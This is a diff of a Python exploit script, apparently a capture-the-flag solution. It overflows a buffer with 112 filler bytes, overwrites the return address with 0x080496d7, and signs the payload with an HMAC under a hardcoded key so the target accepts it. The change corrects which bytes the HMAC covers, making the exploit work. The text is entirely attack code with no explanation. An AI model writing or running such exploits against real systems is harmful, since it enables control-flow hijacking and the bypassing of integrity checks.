@@ -20,7 +20,7 @@ data = padding + bytes.fromhex("080496d7")
 
 sys.stdout.buffer.write(len(b'A' * 112 + (0x080496d7).to_bytes(4,'little')).to_bytes(4, 'little') 
                         + b'A' * 112 + (0x080496d7).to_bytes(4,'little') + 
-                        hmac.new(bytes.fromhex("fd35144ef39207ab0882ae7a1d9db00b4f68778d715b6999bb53d149190388d4"), padding + (0x080496d7).to_bytes(4,'little'), hashlib.sha256).digest())
+                        hmac.new(bytes.fromhex("fd35144ef39207ab0882ae7a1d9db00b4f68778d715b6999bb53d149190388d4"), b'A' * 112 + (0x080496d7).to_bytes(4,'little'), hashlib.sha256).digest())
 
 
 
